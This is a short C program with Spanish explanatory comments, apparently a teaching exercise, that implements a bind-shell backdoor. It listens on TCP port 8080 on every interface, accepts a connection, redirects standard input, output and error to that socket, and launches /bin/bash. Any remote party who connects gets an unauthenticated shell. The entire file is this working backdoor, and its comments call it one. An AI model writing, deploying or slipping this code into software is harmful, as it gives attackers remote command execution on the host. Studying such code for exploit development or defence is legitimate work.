#include <unistd.h> 
#include <stdio.h> 
#include <sys/socket.h> 
#include <stdlib.h> 
#include <netinet/in.h> 
#include <string.h>

//Declarando el puerto que estará escuchando el socket
#define PORT 8080

int main(int argc, char const *argv[]){
  
  //Declarando todas las variables usadas
  int server_fd, new_socket, valread, result;
  struct sockaddr_in address;
  int opt = 1;
  int addrlen = sizeof(address);
  char buffer[1024] = {0};
  char *hello = "Hello";
  
  //Creando el socket y cuidando que no haya ningún error, la función socket() es una llamada al sistema para comenzar a dejar un puerto escuchando
  if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0){ 
    perror("socket failed"); 
    exit(EXIT_FAILURE); 
  }
  
  //Definiendo el socket como tipo TCP
  if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))){
    perror("setsockopt"); 
    exit(EXIT_FAILURE); 
  }

  //Definiendo la IP y puerto del socket
  address.sin_family = AF_INET; 
  address.sin_addr.s_addr = INADDR_ANY; 
  address.sin_port = htons(PORT);
  
  //La función bind() sirve para hacer una llamada a sistema para que tenga la IP especificada (sys_bind)
  bind(server_fd, (struct sockaddr *)&address, sizeof(address));

  //La función listen() sirve para decirle al sistema que el socket comenzará a escuchar con todas las propiedades antes especificadas
  listen(server_fd,0);

  //result es la variable que se asigna cuando se acepta una conexión
  result = accept(server_fd,NULL,NULL);

  //syscall 63
  dup2(result,2);
  dup2(result,1);
  dup2(result,0);

  //Llamando al bash para que se ejecute en el puerto donde está el socket esuchando (backdoor)
  execve("/bin/bash",NULL,NULL);

  return 0;
}
